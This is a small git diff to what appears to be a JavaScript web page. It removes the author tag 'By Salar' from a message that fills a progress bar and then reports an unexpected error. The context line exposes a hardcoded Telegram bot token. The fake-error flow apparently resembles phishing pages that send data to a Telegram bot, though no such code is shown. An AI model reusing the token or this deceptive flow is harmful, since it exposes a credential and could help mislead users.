@@ -88,7 +88,7 @@ const botToken = '8446779579:AAGVCT45Qfe3ZbR7Qxs7iVWDvb_CXeV-5jc';
 
       setTimeout(() => {
         progressFill.style.width = `100%`;
-        progressText.textContent = '❌ An unexpected error occurred. Please try again later. By Salar';
+        progressText.textContent = '❌ An unexpected error occurred. Please try again later.';
         progressText.style.color = '#ff6b6b';
       }, 500);
     });
